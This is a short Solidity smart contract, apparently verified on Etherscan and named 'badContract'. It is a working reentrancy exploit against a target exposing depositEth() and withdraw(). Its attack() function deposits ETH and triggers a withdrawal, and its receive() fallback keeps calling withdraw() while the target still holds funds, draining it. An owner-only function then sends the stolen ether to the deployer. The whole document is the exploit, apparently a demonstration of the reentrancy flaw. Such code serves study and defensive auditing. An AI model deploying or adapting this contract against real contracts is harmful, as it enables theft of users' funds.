/**
 *Submitted for verification at Etherscan.io on 2022-10-31
*/

// SPDX-License-Identifier: MIT
//Contract addresss 0x0E0e81dF82D1A8480811704845468DcF6729B603
pragma solidity ^0.8.7;

interface IgoodContract {
    function depositEth() external payable;
    function withdraw() external; 
}

contract badContract {
    IgoodContract public goodContract;
    address public owner;
    //Constructor statement
    constructor(address _goodContractAddress) {
        goodContract = IgoodContract(_goodContractAddress);
        owner = msg.sender;
    }
    //Function to recive eth
    receive() external payable {
        if (address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }
        //Start the attack 
    function attack() public payable {
        goodContract.depositEth{value: msg.value}();
        goodContract.withdraw();
    }
    //Function to withdraw funds to owner
    function withdraw() public {
        require(msg.sender == owner, "Not allowed");
        (bool sent, ) = address(this).call{value: address(this).balance}("");
        require(sent, "Failed to send ether");
    }

}